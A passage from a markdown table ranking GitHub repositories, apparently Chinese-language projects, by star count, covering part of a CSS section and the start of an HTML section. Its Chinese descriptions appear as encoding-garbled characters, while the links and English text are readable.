|114|[lewis-geek/hexo-theme-Aath](https://github.com/lewis-geek/hexo-theme-Aath)|Hexo ‰∏ªÈ¢ò|154|CSS|05/31|
|115|[liuhuanyong/liuhuanyong.github.io](https://github.com/liuhuanyong/liuhuanyong.github.io)|Èù¢Âêë‰∏≠ÊñáËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÁöÑÂÖ≠ÂçÅ‰ΩôÁ±ªÂÆûË∑µÈ°πÁõÆÂèäÂ≠¶‰π†Á¥¢ÂºïÔºåÊ∂µÁõñËØ≠Ë®ÄËµÑÊ∫êÊûÑÂª∫„ÄÅÁ§æ‰ºöËÆ°ÁÆó„ÄÅËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÁªÑ‰ª∂„ÄÅÁü•ËØÜÂõæË∞±„ÄÅ‰∫ãÁêÜÂõæË∞±„ÄÅÁü•ËØÜÊäΩÂèñ„ÄÅÊÉÖÊÑüÂàÜÊûê„ÄÅÊ∑±Â∫¶Â≠¶‰π†Á≠âÂá†‰∏™Â≠¶‰π†‰∏ªÈ¢ò„ÄÇÂåÖÊã¨‰ΩúËÄÖ‰∏™‰∫∫ÁÆÄ‰ªã„ÄÅÂ≠¶‰π†ÂøÉÂæó„ÄÅËØ≠Ë®ÄËµÑÊ∫ê„ÄÅÂ∑•‰∏öËêΩÂú∞Á≥ªÁªüÁ≠âÔºåÊòØ‰æõËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÂÖ•Èó®Â≠¶‰π†ËÄÖÁöÑ‰∏Ä‰∏™ËæÉ‰∏∫ÂÖ®Èù¢ÁöÑÂ≠¶‰π†ËµÑÊ∫êÔºåÊ¨¢ËøéÂ§ßÂÆ∂‰ΩøÁî®ÔºåÂπ∂ÊèêÂá∫ÊâπËØÑÊÑèËßÅ„ÄÇ|153|CSS|10/27|
|116|[Lxxyx/LxxyxResume](https://github.com/Lxxyx/LxxyxResume)|ÂâçÁ´ØÁÆÄÂéÜÁîüÊàêÂô®|143|CSS|09/03|
|117|[apachecn/storm-doc-zh](https://github.com/apachecn/storm-doc-zh)|Apache Storm ÂÆòÊñπÊñáÊ°£‰∏≠ÊñáÁâà|143|CSS|10/06|
|118|[pangxiaobin/CrawlerHot](https://github.com/pangxiaobin/CrawlerHot)|‰ªäÊó•ÁÉ≠Ê¶ú   ÊäìÂèñÁΩëÁ´ôÁÉ≠Ê¶ú‰ø°ÊÅØÔºåÂπ∂‰∏îÂâçÁ´ØËøõË°åÂ±ïÁ§∫|139|CSS|10/25|
|119|[d2-projects/d2-daily](https://github.com/d2-projects/d2-daily)|D2 Êó•Êä•|137|CSS|09/07|
|120|[zhitom/zkweb](https://github.com/zhitom/zkweb)|zookeeper webÁÆ°ÁêÜÂíåÁõëÊéßÁïåÈù¢Ôºå‰ΩøÁî®ÂÜÖÁΩÆÁöÑH2Êï∞ÊçÆÂ∫ìÔºåÊ≠§ÁâàÊú¨Âü∫‰∫éÊ∑òÂÆùÂ§ßÁ•ûyasenagatÁöÑzkWebÊ∫êÁ†ÅÂü∫Á°Ä‰πã‰∏äËøõË°å‰∫ÜÂ§ßÂπÖÂçáÁ∫ßÂíå‰øÆÊîπÔºå‰∏ªË¶ÅÊñ∞Â¢û‰∫ÜÈõÜÁæ§ÁõëÊéßÂíåÂõΩÈôÖÂåñÂäüËÉΩÔºåÁõ¥Êé•java -jarÊàñÂ∞ÜwarÂåÖÊîæÂÖ•tomcatÂç≥ÂèØËøêË°åÔºÅÊúÄËøëÊñ∞Â¢ûÂä†‰∫ÜdockerÈïúÂÉèÂäüËÉΩÔºÅ|135|CSS|04/18|
|121|[realpdai/springboot-javafx-app-demo](https://github.com/realpdai/springboot-javafx-app-demo)|springboot+Javafx Ê°åÈù¢Â∫îÁî®|134|CSS|09/06|
|122|[emacs-china/elpa](https://github.com/emacs-china/elpa)|Emacs China ELPA ÈïúÂÉè|132|CSS|08/15|
|123|[liuxiaoyucc/uni-app-moments](https://github.com/liuxiaoyucc/uni-app-moments)|:star2: uni-app-moments Á±ª‰ººÂæÆ‰ø°ÊúãÂèãÂúàÊ®°Áâà|131|CSS|10/19|
|124|[52bp/52bp.github.io](https://github.com/52bp/52bp.github.io)|ÂàÜ‰∫´ÂÖçË¥πSSR V2ray Trojan ÂÖçË¥π„ÄÅ‰ºòË¥®ËäÇÁÇπÊú∫Âú∫Â§ßÂÖ®ÂØºËà™Êé®ËçêÔºåËÆ∞ÂæóÁÇπÂáªstar‚≠ê==‰∏çËø∑Ë∑Ø|130|CSS|10/28|
|125|[idealclover/Life-in-NJU](https://github.com/idealclover/Life-in-NJU)|üè† ÂçóÂì™ÊåáÂçó‚ÄîÂçóÂì™Â§ßÂ≠¶ÁΩëÂùÄÂØºËà™|130|CSS|10/08|
|126|[ColdDay/VideoToGIF](https://github.com/ColdDay/VideoToGIF)|video to gif ËßÜÈ¢ëËΩ¨gifÂà∂‰ΩúË°®ÊÉÖÂåÖÊèí‰ª∂ÔºàÂèØ‰ª•Ê∑ªÂä†ÊñáÂ≠óÔºâ|128|CSS|07/30|
|127|[Piasy/AdvancedRxJava](https://github.com/Piasy/AdvancedRxJava)|Advanced RxJava http://akarnokd.blogspot.com/ Á≥ªÂàóÂçöÂÆ¢ÁöÑ‰∏≠ÊñáÁøªËØëÔºåÂ∑≤ÂæÅÂæó‰ΩúËÄÖÊéàÊùÉ„ÄÇ|128|CSS|02/24|
|128|[apachecn/ds-ai-tech-notes](https://github.com/apachecn/ds-ai-tech-notes)|:book: [ËØë] Êï∞ÊçÆÁßëÂ≠¶Âíå‰∫∫Â∑•Êô∫ËÉΩÊäÄÊúØÁ¨îËÆ∞|121|CSS|10/06|
|129|[coloz/image-to-bitmap-array](https://github.com/coloz/image-to-bitmap-array)|convert image to C bitmap array   ‰∏Ä‰∏™Á∫ØÂâçÁ´ØÁöÑÂõæÁâáÂèñÊ®°Á®ãÂ∫è|118|CSS|09/12|
|130|[apachecn/seaborn-doc-zh](https://github.com/apachecn/seaborn-doc-zh)|:book: [ËØë] seaborn 0.9 ‰∏≠ÊñáÊñáÊ°£|117|CSS|10/06|
|131|[apachecn/elasticsearch-doc-zh](https://github.com/apachecn/elasticsearch-doc-zh)|:book: [ËØë] elasticsearch ‰∏≠ÊñáÊñáÊ°£|117|CSS|10/06|
|132|[Yuchunchen/BuildYourOwnConferenceSystem](https://github.com/Yuchunchen/BuildYourOwnConferenceSystem)|ÈÄôÂÄãË®àÁï´ÁõÆÁöÑÂú®ÊñºÊèê‰æõ„ÄåÂø´ÈÄüÊû∂Á´ôÊá∂‰∫∫ÂåÖ„ÄçÔºåÂçîÂä©ÊÇ®Âø´ÈÄüÊû∂ÊßãËá™Â∑±Â∞àÂ±¨„ÄÅÂÖçË≤ª„ÄÅÂÆâÂÖ®„ÄÅÊòìÁî®ÁöÑË¶ñË®äÊúÉË≠∞Á≥ªÁµ±„ÄÇ|117|CSS|05/16|
|133|[smallnest/go-rpc-programming-guide](https://github.com/smallnest/go-rpc-programming-guide)|gitbook Go RPCÂºÄÂèëÊåáÂçó [‰∏≠ÊñáÊñáÊ°£]|116|CSS|07/13|
|134|[apachecn/calc4b-zh](https://github.com/apachecn/calc4b-zh)|:book: [ËØë] MIT 18.03 Èù¢ÂêëÂàùÂ≠¶ËÄÖÁöÑÂæÆÁßØÂàÜ|114|CSS|10/06|
|135|[laike9m/zhihu-card](https://github.com/laike9m/zhihu-card)|Áî®Âç°ÁâáÂú®‰∏™‰∫∫ÁΩëÁ´ô‰∏äÂ±ïÁ§∫Áü•‰πéË¥¶Êà∑|113|CSS|02/02|
|136|[Hello-hao/HellohaoWallpaper](https://github.com/Hello-hao/HellohaoWallpaper)|Âü∫‰∫éSpringBootÁöÑÈ´òÊ∏ÖÂ£ÅÁ∫∏ÂõæÁâáÁ´ô„ÄÇ|113|CSS|07/25|
|137|[x-cold/yuque-blog](https://github.com/x-cold/yuque-blog)|Âü∫‰∫éËØ≠ÈõÄ‰Ωú‰∏∫ÂêéÂè∞ÂÆûÁé∞ÁöÑÂçöÂÆ¢Á≥ªÁªü|112|CSS|07/28|
|138|[BiYuqi/webpack-seed](https://github.com/BiYuqi/webpack-seed)|:roller_coaster: A Multi Page Application base on webpack and babel. webpackÊê≠Âª∫Â§öÈ°µÈù¢Ê®°Êùø|110|CSS|09/29|
|139|[thinkphp-tech/think-builder](https://github.com/thinkphp-tech/think-builder)|A command line toolit to build applications' CRUD/mvc scaffold for thinkphp v6. Áî®‰∫éÁîüÊàê thinkphp v6 Â¢ûÊü•ÊîπÂà†ËÑöÊâãÊû∂‰ª£Á†ÅÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑„ÄÇ|105|CSS|04/27|
|140|[lvyueyang/web-music](https://github.com/lvyueyang/web-music)|‰∏Ä‰∏™ÁÆÄÂçïÁöÑÈü≥‰πêÊí≠ÊîæÂô®ÔºåÊí≠ÊîæÂë®Êù∞‰º¶ÁöÑÊ≠åÊõ≤|105|CSS|07/16|
|141|[apachecn/ds100-textbook-zh](https://github.com/apachecn/ds100-textbook-zh)|:book: [ËØë] UCB DS100 Êï∞ÊçÆÁßëÂ≠¶ÁöÑÂéüÁêÜ‰∏éÊäÄÂ∑ß|104|CSS|10/06|
|142|[jangdelong/hexo-theme-xups](https://github.com/jangdelong/hexo-theme-xups)|hexo‰∏ªÈ¢òxups|104|CSS|02/23|
|143|[hahaha108/copyBook](https://github.com/hahaha108/copyBook)|Áî®Áà¨Ëô´Áà¨ÂèñÂ∞èËØ¥ÁΩëÁ´ô‰∏äÊâÄÊúâÂ∞èËØ¥ÔºåÂ≠òÂÇ®Âà∞Êï∞ÊçÆÂ∫ì‰∏≠ÔºåÂπ∂Áî®Áà¨Âà∞ÁöÑÊï∞ÊçÆÊûÑÂª∫Ëá™Â∑±ÁöÑÂ∞èËØ¥ÁΩëÁ´ô|102|CSS|08/20|
|144|[hack-fang/nCov](https://github.com/hack-fang/nCov)|ÂÖ®ÂõΩÂèäÂêÑÁúÅÊñ∞ÂûãËÇ∫ÁÇéÁñ´ÊÉÖÊÉÖÂÜµÂõæ(Êï∞ÊçÆÂÅúÊ≠¢Êõ¥Êñ∞)|101|CSS|02/20|
|145|[SwiftGGTeam/GGHexo](https://github.com/SwiftGGTeam/GGHexo)|ÊâìÈÄ†ÂõΩÂÜÖÁ¨¨‰∏Ä Swift ËØëÊñáÁ´ô|100|CSS|09/04|
|146|[Surile/Abraham](https://github.com/Surile/Abraham)|Â∞èÁ®ãÂ∫èÂûÉÂúæÂàÜÁ±ª|96|CSS|09/10|
|147|[Bulandent/hexo-theme-bubuzou](https://github.com/Bulandent/hexo-theme-bubuzou)|‰∏Ä‰∏™‰ªøVueÂÆòÁΩëÈ£éÊ†ºÁöÑhexo‰∏ªÈ¢ò  https://bubuzou.com/|95|CSS|08/13|
|148|[SerhoLiu/serholiu.com](https://github.com/SerhoLiu/serholiu.com)|ÊàëÁöÑÂçöÂÆ¢|93|CSS|07/11|
|149|[cgq001/dingdong](https://github.com/cgq001/dingdong)|ÂèÆÂíö‰π∞ËèúÂâçÁ´Ø|92|CSS|06/23|
|150|[luokangyuan/ghost-theme-mj](https://github.com/luokangyuan/ghost-theme-mj)|This is a beautiful ghost blog themeÔºåËøôÊòØ‰∏Ä‰∏™ÊºÇ‰∫ÆÁöÑGhostÂçöÂÆ¢‰∏ªÈ¢ò„ÄÇ|92|CSS|06/06|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## HTML

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[fengdu78/Coursera-ML-AndrewNg-Notes](https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes)|Âê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊú∫Âô®Â≠¶‰π†ËØæÁ®ã‰∏™‰∫∫Á¨îËÆ∞|19.3k|HTML|10/28|
|2|[QSCTech/zju-icicles](https://github.com/QSCTech/zju-icicles)|ÊµôÊ±üÂ§ßÂ≠¶ËØæÁ®ãÊîªÁï•ÂÖ±‰∫´ËÆ°Âàí|19.2k|HTML|10/24|
|3|[TeamStuQ/skill-map](https://github.com/TeamStuQ/skill-map)|Á®ãÂ∫èÂëòÊäÄËÉΩÂõæË∞±|17.4k|HTML|08/28|
|4|[PKUanonym/REKCARC-TSC-UHT](https://github.com/PKUanonym/REKCARC-TSC-UHT)|Ê∏ÖÂçéÂ§ßÂ≠¶ËÆ°ÁÆóÊú∫Á≥ªËØæÁ®ãÊîªÁï• Guidance for courses in Department of Computer Science and Technology, Tsinghua University|15.3k|HTML|10/16|
|5|[jaywcjlove/linux-command](https://github.com/jaywcjlove/linux-command)|LinuxÂëΩ‰ª§Â§ßÂÖ®ÊêúÁ¥¢Â∑•ÂÖ∑ÔºåÂÜÖÂÆπÂåÖÂê´LinuxÂëΩ‰ª§ÊâãÂÜå„ÄÅËØ¶Ëß£„ÄÅÂ≠¶‰π†„ÄÅÊêúÈõÜ„ÄÇhttps://git.io/linux|14.5k|HTML|10/29|
|6|[nndl/nndl.github.io](https://github.com/nndl/nndl.github.io)|„ÄäÁ•ûÁªèÁΩëÁªú‰∏éÊ∑±Â∫¶Â≠¶‰π†„Äã ÈÇ±Èî°ÈπèËëó Neural Network and Deep Learning |13.5k|HTML|10/22|
|7|[fengdu78/deeplearning_ai_books](https://github.com/fengdu78/deeplearning_ai_books)|deeplearning.aiÔºàÂê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊ∑±Â∫¶Â≠¶‰π†ËØæÁ®ãÁ¨îËÆ∞ÂèäËµÑÊ∫êÔºâ|12.1k|HTML|09/21|
|8|[flutterchina/flutter-in-action](https://github.com/flutterchina/flutter-in-action)|„ÄäFlutterÂÆûÊàò„ÄãÁîµÂ≠ê‰π¶|7.8k|HTML|09/28|
|9|[PanDownloadServer/Server](https://github.com/PanDownloadServer/Server)|PanDownloadÁöÑ‰∏™‰∫∫Áª¥Êä§ÁâàÊú¨|7.1k|HTML|09/25|
|10|[open-power-workgroup/Hospital](https://github.com/open-power-workgroup/Hospital)|OpenPowerÂ∑•‰ΩúÁªÑÊî∂ÈõÜÊ±áÊÄªÁöÑÂåªÈô¢ÂºÄÊîæÊï∞ÊçÆ|6.5k|HTML|10/27|
|11|[easzlab/kubeasz](https://github.com/easzlab/kubeasz)|‰ΩøÁî®AnsibleËÑöÊú¨ÂÆâË£ÖK8SÈõÜÁæ§Ôºå‰ªãÁªçÁªÑ‰ª∂‰∫§‰∫íÂéüÁêÜÔºåÊñπ‰æøÁõ¥Êé•Ôºå‰∏çÂèóÂõΩÂÜÖÁΩëÁªúÁéØÂ¢ÉÂΩ±Âìç|6.2k|HTML|10/29|
|12|[fool2fish/dragon-book-exercise-answers](https://github.com/fool2fish/dragon-book-exercise-answers)|Compilers Principles, Techniques, & Tools (purple dragon book) second edition exercise answers. ÁºñËØëÂéüÁêÜÔºàÁ¥´Èæô‰π¶ÔºâÁ¨¨2Áâà‰π†È¢òÁ≠îÊ°à„ÄÇ|4.2k|HTML|10/13|
|13|[cloudfavorites/favorites-web](https://github.com/cloudfavorites/favorites-web)|‰∫ëÊî∂Ëóè Spring Boot 2.X ÂºÄÊ∫êÈ°πÁõÆ|4.2k|HTML|02/28|
|14|[me115/linuxtools_rst](https://github.com/me115/linuxtools_rst)|LinuxÂ∑•ÂÖ∑Âø´ÈÄüÊïôÁ®ã|4.1k|HTML|08/19|
|15|[sofish/typo.css](https://github.com/sofish/typo.css)|‰∏≠ÊñáÁΩëÈ°µÈáçËÆæ‰∏éÊéíÁâàÔºö‰∏ÄËá¥ÂåñÊµèËßàÂô®ÊéíÁâàÊïàÊûúÔºåÊûÑÂª∫ÊúÄÈÄÇÂêà‰∏≠ÊñáÈòÖËØªÁöÑÁΩëÈ°µÊéíÁâà|4.0k|HTML|10/01|
|16|[tmallfe/tmallfe.github.io](https://github.com/tmallfe/tmallfe.github.io)|Â§©Áå´ÂâçÁ´Ø|3.9k|HTML|04/07|
|17|[golang-china/gopl-zh](https://github.com/golang-china/gopl-zh)|:books: GoËØ≠Ë®ÄÂú£Áªè‰∏≠ÊñáÁâà|3.9k|HTML|05/26|
|18|[HT524/500LineorLess_CN](https://github.com/HT524/500LineorLess_CN)|500 line or less ‰∏≠ÊñáÁøªËØëËÆ°Âàí„ÄÇ|3.6k|HTML|08/28|
|19|[javascript-tutorial/zh.javascript.info](https://github.com/javascript-tutorial/zh.javascript.info)|Áé∞‰ª£ JavaScript ÊïôÁ®ãÔºàThe Modern JavaScript TutorialÔºâ|3.4k|HTML|10/20|
|20|[Jack-Cherish/Machine-Learning](https://github.com/Jack-Cherish/Machine-Learning)|:zap:Êú∫Âô®Â≠¶‰π†ÂÆûÊàòÔºàPython3ÔºâÔºökNN„ÄÅÂÜ≥Á≠ñÊ†ë„ÄÅË¥ùÂè∂ÊñØ„ÄÅÈÄªËæëÂõûÂΩí„ÄÅSVM„ÄÅÁ∫øÊÄßÂõûÂΩí„ÄÅÊ†ëÂõûÂΩí|3.4k|HTML|10/01|
|21|[itorr/nbnhhsh](https://github.com/itorr/nbnhhsh)|üò©„ÄåËÉΩ‰∏çËÉΩÂ•ΩÂ•ΩËØ¥ËØùÔºü„Äç ÊãºÈü≥È¶ñÂ≠óÊØçÁº©ÂÜôÁøªËØëÂ∑•ÂÖ∑|3.2k|HTML|06/09|
|22|[gwuhaolin/dive-into-webpack](https://github.com/gwuhaolin/dive-into-webpack)|ÂÖ®Èù¢ÁöÑWebpackÊïôÁ®ã„ÄäÊ∑±ÂÖ•ÊµÖÂá∫Webpack„ÄãÁîµÂ≠ê‰π¶|3.2k|HTML|08/04|
|23|[resumejob/awesome-resume](https://github.com/resumejob/awesome-resume)|Á®ãÂ∫èÂëòÁÆÄÂéÜ‰æãÂè•ÔºåÁ®ãÂ∫èÂëòÁÆÄÂéÜËåÉ‰æãÔºåJavaÁÆÄÂéÜÊ®°ÁâàÔºåPythonÁÆÄÂéÜÊ®°ÁâàÔºåC++ÁÆÄÂéÜÊ®°Áâà|2.9k|HTML|09/13|
|24|[blinkfox/hexo-theme-matery](https://github.com/blinkfox/hexo-theme-matery)|A beautiful hexo blog theme with material design and responsive design.‰∏Ä‰∏™Âü∫‰∫éÊùêÊñôËÆæËÆ°ÂíåÂìçÂ∫îÂºèËÆæËÆ°ËÄåÊàêÁöÑÂÖ®Èù¢„ÄÅÁæéËßÇÁöÑHexo‰∏ªÈ¢ò„ÄÇÂõΩÂÜÖËÆøÈóÆÔºöhttp://blinkfox.com|2.7k|HTML|10/25|
|25|[wx-chevalier/Developer-Zero-To-Mastery](https://github.com/wx-chevalier/Developer-Zero-To-Mastery)|:books: To Be Professional Developer From Zero To Mastery, Interactive MindMap, RoadMap(Learning Path/Interview Questions), xCompass, Weekly for Developer, to Learn Everything in ITCS  :dizzy: Á®ãÂ∫èÂëòÁöÑÊäÄÊúØËßÜÈáé„ÄÅÁü•ËØÜÁÆ°ÁêÜ‰∏éËÅå‰∏öËßÑÂàíÔºåÊèêÈ´ò‰∏™‰∫∫‰∏éÂõ¢ÈòüÁöÑÁ†îÂèëÊïàËÉΩ|2.7k|HTML|10/16|
|26|[shishan100/Java-Interview-Advanced](https://github.com/shishan100/Java-Interview-Advanced)|‰∏≠ÂçéÁü≥Êùâ--‰∫íËÅîÁΩëJavaËøõÈò∂Èù¢ËØïËÆ≠ÁªÉËê•|2.6k|HTML|04/15|
|27|[doocs/technical-books](https://github.com/doocs/technical-books)|üòÜ ÂõΩÂÜÖÂ§ñ‰∫íËÅîÁΩëÊäÄÊúØÂ§ßÁâõ‰ª¨ÈÉΩÂÜô‰∫ÜÂì™‰∫õ‰π¶Á±çÔºöËÆ°ÁÆóÊú∫Âü∫Á°Ä„ÄÅÁΩëÁªú„ÄÅÂâçÁ´Ø„ÄÅÂêéÁ´Ø„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÊû∂ÊûÑ„ÄÅÂ§ßÊï∞ÊçÆ„ÄÅÊ∑±Â∫¶Â≠¶‰π†...|2.5k|HTML|10/20|
|28|[eddycjy/blog](https://github.com/eddycjy/blog)|ÁÖéÈ±ºÁöÑÂçöÂÆ¢ÔºåÊúâÁÇπÂøôÔºå‰º†ÈÄÅÈó®Ôºöhttps://eddycjy.com|2.5k|HTML|10/28|
|29|[cytle/wechat_web_devtools](https://github.com/cytle/wechat_web_devtools)|ÂæÆ‰ø°ÂºÄÂèëËÄÖÂ∑•ÂÖ∑(ÂæÆ‰ø°Â∞èÁ®ãÂ∫è)linuxÂÆåÁæéÊîØÊåÅ|2.5k|HTML|09/14|
|30|[sprov065/v2-ui](https://github.com/sprov065/v2-ui)|ÊîØÊåÅÂ§öÂçèËÆÆÂ§öÁî®Êà∑ÁöÑ v2ray Èù¢ÊùøÔºåSupport multi-protocol multi-user v2ray panel|2.5k|HTML|10/20|
|31|[refscn/rplibs](https://github.com/refscn/rplibs)|Refs.cn ÂéüÂûãËÆæËÆ°ÂÖÉ‰ª∂Â∫ìÔºåÂü∫‰∫éAxure RP 9/8ÔºåÊîØÊåÅ Android„ÄÅApple„ÄÅWindows„ÄÅÂæÆ‰ø°ÔºåÁßªÂä®„ÄÅÊ°åÈù¢Âπ≥Âè∞ÁöÑÂ∫îÁî®ÂíåÁΩëÁ´ôÂéüÂûãËÆæËÆ°„ÄÇ  ‰∏âÂπ¥ÂéÜÁ®ã 2k starÔºåÊÑüË∞¢Â§ßÂÆ∂‰ΩøÁî®„ÄÇ|2.2k|HTML|09/03|
|32|[anbang/javascript-notes](https://github.com/anbang/javascript-notes)|Êú±ÂÆâÈÇ¶ÁöÑ JavaScript Â≠¶‰π†Á¨îËÆ∞ÔºõJavaScriptÂ≠¶‰π†ÊÄªÁªìÔºõÂâçÁ´ØÂèòÂåñÂ§™Âø´ÔºåÂè™ÊúâÊääJSÂü∫Á°ÄÊâìÊâéÂÆû‰∫ÜÔºåÊâçËÉΩÊ∏∏ÂàÉÊúâ‰ΩôÔºõ‰∏∫‰∫ÜËÆ©ÊàëÁöÑJavaScriptÂü∫Á°ÄÂºÇÂ∏∏Áâ¢Âõ∫ÔºåÊÄùË∑ØÊõ¥Âä†Ê∏ÖÊô∞ÔºåÊàë‰ºöÊää‰ª•ÂâçÊÄªÁªìËøáÁöÑÁü•ËØÜÂíåÂπ≥Êó∂ÁúãÂà∞ÁöÑËµÑÊñôÊîæÂú®ËøôÈáåÔºåÊää‰ª•ÂâçÈõ∂Èõ∂Êï£Êï£ÁöÑÁü•ËØÜÁÇπÂÖ®ÈÉ®‰∏≤Ëµ∑Êù•ÔºÅËøô‰∏™È°πÁõÆ‰πüËÆ∏ÂÜôÂà∞ÊúÄÂêé‰ºöÊòØ‰∏Ä‰∏™ÈùûÂ∏∏‰∏çÈîôÁöÑJavaScriptÊïôÁ®ãÔºåÂ∏åÊúõÂèØ‰ª•Â∏ÆÂà∞Êõ¥Â§öÁöÑ‰∫∫ÔºõÊî∂ËóèËØ∑ÁÇπstarÔºõÂ¶ÇÊûúÂèëÁé∞ÊàëÊúâÂÜôÈîôËØØÁöÑÔºåÊ¨¢ËøéÈöèÊó∂Â∏ÆÊàëÊîπÊ≠£ÔºåÊàñËÄÖÂ¢ûÂä†Êñ∞ÁöÑËßÇÁÇπÔºåË∞¢Ë∞¢ÔºÅ|1.9k|HTML|03/08|
|33|[phodal/fe](https://github.com/phodal/fe)|„ÄäÊàëÁöÑËÅå‰∏öÊòØÂâçÁ´ØÂ∑•Á®ãÂ∏à„Äã - EbookÔºöI'm a FrontEnd Developer|1.9k|HTML|09/16|
|34|[phodal/designiot](https://github.com/phodal/designiot)|Êïô‰Ω†ËÆæËÆ°Áâ©ËÅîÁΩëÁ≥ªÁªü„ÄÇÊûÑÂª∫Ëá™Â∑±ÁöÑInternet of Things „ÄÇ|1.8k|HTML|08/11|
|35|[fluid-dev/hexo-theme-fluid](https://github.com/fluid-dev/hexo-theme-fluid)|:ocean: ‰∏ÄÊ¨æ Material Design È£éÊ†ºÁöÑ Hexo ‰∏ªÈ¢ò / An elegant Material-Design theme for Hexo|1.8k|HTML|10/29|
|36|[riku/Markdown-Syntax-CN](https://github.com/riku/Markdown-Syntax-CN)|Markdown ËØ≠Ê≥ïÁÆÄ‰Ωì‰∏≠ÊñáÁâàÔºàfork ‰∫éÁπÅ‰Ωì‰∏≠ÊñáÁâà http://markdown.tw/ Ôºâ|1.8k|HTML|07/07|
|37|[gwuhaolin/blog](https://github.com/gwuhaolin/blog)|Êµ©È∫üÁöÑÊäÄÊúØÂçöÂÆ¢|1.7k|HTML|08/20|
|38|[sinaweibosdk/weibo_android_sdk](https://github.com/sinaweibosdk/weibo_android_sdk)|Êñ∞Êµ™ÂæÆÂçö Android SDK|1.7k|HTML|09/02|
|39|[HiddenStrawberry/Crawler_Illegal_Cases_In_China](https://github.com/HiddenStrawberry/Crawler_Illegal_Cases_In_China)|Collection of China illegal cases about web crawler Êú¨È°πÁõÆÁî®Êù•Êï¥ÁêÜÊâÄÊúâ‰∏≠ÂõΩÂ§ßÈôÜÁà¨Ëô´ÂºÄÂèëËÄÖÊ∂âËØâ‰∏éËøùËßÑÁõ∏ÂÖ≥ÁöÑÊñ∞Èóª„ÄÅËµÑÊñô‰∏éÊ≥ïÂæãÊ≥ïËßÑ„ÄÇËá¥Âäõ‰∫éÂ∏ÆÂä©Âú®‰∏≠ÂõΩÂ§ßÈôÜÂ∑•‰ΩúÁöÑÁà¨Ëô´Ë°å‰∏ö‰ªé‰∏öËÄÖ‰∫ÜËß£ÊàëÂõΩÁõ∏ÂÖ≥Ê≥ïÂæãÔºåÈÅøÂÖçËß¶Á¢∞Êï∞ÊçÆÂêàËßÑÁ∫¢Á∫ø„ÄÇ [AD]‰∏≠ÊñáÁü•ËØÜÂõæË∞±Èó®Êà∑ |1.6k|HTML|09/27|
|40|[EvilCult/iptv-m3u-maker](https://github.com/EvilCult/iptv-m3u-maker)|IPTV ÂõΩÂÜÖ+ÂõΩÂ§ñ ÁîµËßÜÂè∞Áõ¥Êí≠Ê∫êm3uÊñá‰ª∂, Êî∂ÈõÜ&Ê±áÊÄª&Êú¨Âú∞Ê∫êËÑöÊú¨|1.6k|HTML|09/30|
|41|[kujian/frontendDaily](https://github.com/kujian/frontendDaily)|ÂâçÁ´ØÂºÄÂèëÊäÄÊúØÊó•Êä•ÔºåÊØèÊó•ÂàÜ‰∫´‰∫íËÅîÁΩëÊúÄÁ≤æÂΩ©ÁöÑÂâçÁ´ØÊäÄÊúØ„ÄÅÂâçÁ´ØËµÑËÆØ„ÄÅÂêéÁ´ØÁºñÁ®ã„ÄÅËÆæËÆ°ÂíåËµÑÊ∫êÁ≠âÔºåÊ¨¢ËøéÂÖ≥Ê≥®Watch|1.6k|HTML|09/10|
|42|[ccforward/cc](https://github.com/ccforward/cc)|‰ª£Á†ÅÂ∫ì & Blog|1.6k|HTML|10/09|
|43|[demopark/electron-api-demos-Zh_CN](https://github.com/demopark/electron-api-demos-Zh_CN)|ËøôÊòØ electron-api-demos ÁöÑ‰∏≠ÊñáÁâàÊú¨, Êõ¥Êñ∞Ëá≥ v2.0.2|1.5k|HTML|09/11|
|44|[F4bwDP6a6W/FLY_US](https://github.com/F4bwDP6a6W/FLY_US)|ÁæéÂõΩÂ§ßÂ≠¶Â§áËÄÉËµÑÊñô How to apply US colleges|1.5k|HTML|05/03|
|45|[qiwihui/hiwifi-ss](https://github.com/qiwihui/hiwifi-ss)|ÊûÅË∑ØÁî±+ssÈÖçÁΩÆ|1.5k|HTML|05/13|
|46|[biaochenxuying/blog](https://github.com/biaochenxuying/blog)|Â§ßÂâçÁ´ØÊäÄÊúØ‰∏∫‰∏ªÔºåËØª‰π¶Á¨îËÆ∞„ÄÅÈöèÁ¨î„ÄÅÁêÜË¥¢‰∏∫ËæÖÔºåÂÅö‰∏™ÁªàË∫´Â≠¶‰π†ËÄÖ„ÄÇ|1.5k|HTML|10/08|
|47|[phodal/serverless](https://github.com/phodal/serverless)|Serverless Êû∂ÊûÑÂ∫îÁî®ÂºÄÂèëÊåáÂçó - Serverless Architecture Application Development Guide with Serverless Framework.|1.5k|HTML|07/17|
|48|[huyaocode/webKnowledge](https://github.com/huyaocode/webKnowledge)|ÂâçÁ´ØÈù¢ËØïÁü•ËØÜÁÇπÊÄªÁªì|1.4k|HTML|10/25|
|49|[sinaweibosdk/weibo_ios_sdk](https://github.com/sinaweibosdk/weibo_ios_sdk)|Êñ∞Êµ™ÂæÆÂçö IOS SDK|1.4k|HTML|10/16|
|50|[golang101/golang101](https://github.com/golang101/golang101)|GoËØ≠Ë®Ä101 : ‰∏ÄÊú¨‰æßÈáç‰∫éGoËØ≠Ë®ÄËØ≠Ê≥ïÂíåËØ≠‰πâÁöÑÁºñÁ®ãËß£ÈáäÂíåÊåáÂØº‰π¶|1.4k|HTML|10/28|
|51|[jeanboydev/Android-ReadTheFuckingSourceCode](https://github.com/jeanboydev/Android-ReadTheFuckingSourceCode)|üòú ËÆ∞ÂΩïÊó•Â∏∏ÁöÑÂºÄÂèëÊäÄÂ∑ßÔºåÂºÄÂèë‰∏≠ÈÅáÂà∞ÁöÑÊäÄÊúØÈáçÁÇπ„ÄÅÈöæÁÇπÔºåÂêÑ‰∏™Áü•ËØÜÁÇπÁöÑÊÄªÁªìÔºå‰ºòË¥®Èù¢ËØïÈ¢òÁ≠âÁ≠â„ÄÇÊåÅÁª≠Êõ¥Êñ∞...|1.4k|HTML|10/09|
